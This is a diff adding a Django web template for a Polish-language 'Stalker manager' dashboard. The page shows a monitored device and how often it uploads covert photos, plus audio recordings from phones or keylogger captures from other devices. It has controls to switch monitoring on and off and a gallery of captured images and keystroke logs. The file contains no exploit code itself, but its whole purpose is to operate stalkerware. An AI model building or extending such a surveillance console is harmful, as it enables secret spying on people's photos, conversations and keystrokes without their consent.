@@ -1,0 +1,72 @@
+{% load staticfiles %}
+
+<head>
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap-theme.min.css">
+  <link rel="stylesheet" href="{% static 'css/blog.css' %}">
+  <link href="https://fonts.googleapis.com/css?family=Indie+Flower" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Indie+Flower|Open+Sans" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<div class="page-header">
+  <blockquote class="blockquote">
+    <h1>Stalker manager</h1>
+    <footer>They’re here</footer>
+  </blockquote>
+</div>
+
+<div class="content container">
+
+  <p style="font-size: 30pt;"> {{device.name}}</p>
+  <p>Uuid: {{ device.uuid }}</p>
+  <a href="#" data-toggle="tooltip" title="Cyk cyk cyk leci foteczka">    <i class="fa fa-camera" style="font-size:120px;color:blue;"></i></a>
+  <p>Status: {{ device.status }}</p>
+  <p>Typ: {{ device.device_type }}</p>
+
+  <p> Zdjęcia wysyłane co: {{device.send_cycle_1}} h</p>
+  {% if device.device_type == "mobile" %}
+  <p> Audio wysyłane co: {{device.send_cycle_2}} h</p>
+  {% else %}
+  <p> Keylogger wysyłany co: {{device.send_cycle_2}} h</p>
+  {% endif %}
+  <a href="/edit/{{device.id}}"><button style="display: inline" type="button" class="btn btn-info">Edytuj</button></a>
+  {% if device.status != 'deactivated' %}
+  <form style="display: inline" action="/off/" method="get">
+    {% csrf_token %}
+
+    <input style="display: inline" type="hidden" name="test" value="{{ device.id }}"></input>
+    <button style="display: inline" type="submit" value="Submit" class="btn btn-warning">Wyłącz</button>
+  </form>
+  {% else %}
+  <form style="display: inline" action="/on/" method="get">
+    {% csrf_token %}
+
+    <input style="display: inline" type="hidden" name="test" value="{{ device.id }}"></input>
+    <button style="display: inline" type="submit" value="Submit" class="btn btn-warning">Włącz</button>
+  </form>
+  {% endif %}
+  <button style="display: inline" type="button" class="btn btn-danger">Usuń</button>
+
+
+  <br><br><br>
+
+
+  {% for picture in pictures %}
+  <span class="col-sm-4">
+<div class="gallery">
+  <a target="_blank" href="{{picture.path}}">
+    <img src="{{picture.path}}" alt="Fjords" width="120" height="120" class="img-thumbnail">
+  </a>
+  <div class="desc">{{picture.timestamp}}</div>
+
+
+</div></span> {% endfor %}
+  {% for textfile in textfiles %}
+  <span class="col-sm-4">
+<div class="gallery">
+  <a href="https://www.youtube.com/watch?v=VF01jddYuyo" data-toggle="tooltip">    <img src="https://cdn0.iconfinder.com/data/icons/tiny-icons-1/100/tiny-15-512.png" width="50" height="50"></a>
+</span>
+<div class="desc">{{textfile.timestamp}}</div>
+{% endfor %}
+</div>
